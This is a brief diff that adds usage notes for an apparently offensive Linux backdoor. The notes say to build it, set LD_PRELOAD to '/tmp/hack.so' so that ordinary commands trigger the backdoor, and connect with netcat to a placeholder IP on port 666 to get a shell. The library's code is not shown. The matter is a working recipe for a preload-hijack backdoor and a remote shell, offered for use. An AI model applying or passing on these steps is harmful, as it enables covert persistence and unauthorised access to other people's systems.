@@ -1,0 +1,4 @@
+### USAGE
+1. make
+2. export LD_PRELOAD="/tmp/hack.so" 
+then use some linux command will trriger the backdoor, use nc xxx.xxx.xxx.xxx 666 get a shell.
